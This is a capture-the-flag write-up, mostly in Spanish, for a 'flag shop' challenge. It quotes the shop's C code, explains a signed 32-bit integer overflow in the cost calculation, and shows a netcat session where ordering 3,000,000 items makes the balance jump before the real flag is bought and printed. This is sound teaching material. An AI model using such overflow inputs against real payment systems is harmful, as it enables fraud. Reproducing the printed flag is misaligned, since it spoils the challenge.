### Descripción
There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.cylabacademy.net/library/5f2eaa2a33e18e2edbca705b6cced84784eb56ccbd8748cdc1041824755f9f04/store.c). Connect with `nc chatelaine.cylabacademy.net 24993`.
Hint: Two's compliment can do some weird things when numbers get really big!
### Solución
1. Primero descargamos el archivo del codigo:
```
~ via C v14.2.0-gcc took 1m33s 
❯ wget https://challenge-files.cylabacademy.net/library/5f2eaa2a33e18e2edbca705b6cced84784eb56ccbd8748cdc1041824755f9f04/store.c
```

2. Checar que contiene el archivo:
	`if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
     }`

Vemos que el código tiene una vulnerabilidad: los costos están declarados como `int` (enteros con signo de 32 bits), lo que significa que tienen un límite matemático positivo de 2,147,483,647. Al no existir una validación que compruebe los topes, si pedimos una cantidad masiva de banderas falsas, la multiplicación del costo total supera esa cifra y la variable se desborda, convirtiéndose en un número negativo enorme (Integer Overflow). Como el programa actualiza nuestro saldo restando ese costo, terminar restando un valor negativo se convierte matemáticamente en una suma, inyectando millones a nuestra cuenta y dándonos los fondos necesarios para comprar la bandera real.

3. De acuerdo a esa vulnerabilidad vamos a intentar comprar la bandera falsa, vamos a poner que queremos 3000000.
   Al multiplicar 3,000,000 por 900, el costo teórico es 2,700,000,000. Al ser mayor que el límite de 32 bits, se desborda y el costo se registra como negativo.   
```
~ via C v14.2.0-gcc 
❯ nc chatelaine.cylabacademy.net 24993
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1

 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000    

The final cost is: -1594967296

Your current balance after transaction: 1594968396

```

4. Ahora que tenemos más saldo en nuestra cuenta lo que haremos será comprar la bandera real: 
```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: academy{m0n3y_bag5_E4eBf2f7}
```

**Flag**: academy{m0n3y_bag5_E4eBf2f7}
### Notas Adicionales

### Referencias